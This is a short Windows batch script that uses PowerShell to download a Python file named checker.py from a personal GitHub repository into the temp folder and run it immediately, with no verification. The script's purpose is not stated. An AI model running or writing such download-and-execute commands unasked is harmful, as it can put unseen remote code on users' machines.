@echo off
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ishmuratovazizi-afk/checker-bot/main/checker.py' -OutFile '%TEMP%\checker.py'; py '%TEMP%\checker.py'"
